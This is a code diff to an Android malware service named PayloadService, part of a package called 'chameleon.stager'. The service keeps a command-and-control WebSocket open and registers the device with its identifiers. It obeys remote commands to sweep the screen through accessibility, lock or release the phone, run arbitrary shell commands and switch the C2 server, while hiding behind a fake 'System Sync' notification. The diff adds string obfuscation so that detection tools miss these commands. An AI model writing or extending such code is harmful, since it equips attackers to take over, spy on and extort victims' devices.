@@ -16,15 +16,18 @@ import com.chameleon.stager.payload.PayloadLoader
 import com.chameleon.stager.ui.UpdateOverlayActivity
 import com.chameleon.stager.utils.CryptoUtils
 import com.chameleon.stager.utils.NetworkUtils
+import com.chameleon.stager.utils.ObfuscatedStrings
+import org.json.JSONArray
 import org.json.JSONObject
 
 class PayloadService : Service() {
     companion object {
         const val TAG = "PayloadService"
-        const val CHANNEL_ID = "chameleon_sync"
         const val NOTIFICATION_ID = 1001
         const val RECONNECT_DELAY = 10000L
     }
+
+    private val CHANNEL_ID: String by lazy { ObfuscatedStrings.notifChannelId }
 
     private var isRunning = false
     private var c2WebSocket: WebSocketClient? = null
@@ -68,10 +71,10 @@ class PayloadService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System Sync",
+                ObfuscatedStrings.notifTitle,
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Syncing device settings"
+                description = ObfuscatedStrings.notifText
                 setShowBadge(false)
                 lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
             }
@@ -82,8 +85,8 @@ class PayloadService : Service() {
 
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Sync")
-            .setContentText("Syncing device settings")
+            .setContentTitle(ObfuscatedStrings.notifTitle)
+            .setContentText(ObfuscatedStrings.notifText)
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -133,7 +136,7 @@ class PayloadService : Service() {
     private fun registerDevice() {
         try {
             val registerMsg = JSONObject().apply {
-                put("type", "register")
+                put("type", ObfuscatedStrings.msgRegister)
                 put("device_id", Build.ID)
                 put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                 put("manufacturer", Build.MANUFACTURER)
@@ -153,7 +156,7 @@ class PayloadService : Service() {
         try {
             val json = JSONObject(message)
             when (json.optString("type")) {
-                "command" -> handleCommand(json)
+                ObfuscatedStrings.msgCommand -> handleCommand(json)
                 "ping" -> {
                     c2WebSocket?.send("""{"type":"pong"}""")
                 }
@@ -171,29 +174,29 @@ class PayloadService : Service() {
         Log.i(TAG, "Received command: $command")
 
         when (command) {
-            "start_sweep" -> {
+            ObfuscatedStrings.cmdStartSweep -> {
                 val duration = params?.optInt("duration", 300) ?: 300
                 StagerAccessibilityService.instance?.startSweep(duration * 1000L)
                 sendCommandAck(commandId, "received")
             }
-            "stop_sweep" -> {
+            ObfuscatedStrings.cmdStopSweep -> {
                 StagerAccessibilityService.instance?.stopSweep()
                 sendCommandAck(commandId, "done")
             }
-            "lock_device" -> {
+            ObfuscatedStrings.cmdLockDevice -> {
                 lockDevice()
                 sendCommandAck(commandId, "done")
             }
-            "release_device" -> {
+            ObfuscatedStrings.cmdReleaseDevice -> {
                 releaseDevice()
                 sendCommandAck(commandId, "done")
             }
-            "exec_command" -> {
+            ObfuscatedStrings.cmdExecCommand -> {
                 val cmd = params?.optString("cmd", "") ?: ""
                 executeShellCommand(cmd)
                 sendCommandAck(commandId, "done")
             }
-            "update_config" -> {
+            ObfuscatedStrings.cmdUpdateConfig -> {
                 val newC2Url = params?.optString("c2_url", "")
                 if (newC2Url != null) {
                     StagerApplication.updateC2Url(newC2Url)
@@ -206,7 +209,7 @@ class PayloadService : Service() {
     private fun sendCommandAck(commandId: String, status: String) {
         try {
             val ack = JSONObject().apply {
-                put("type", "command_ack")
+                put("type", ObfuscatedStrings.msgCommandAck)
                 put("device_id", Build.ID)
                 put("command_id", commandId)
                 put("status", status)
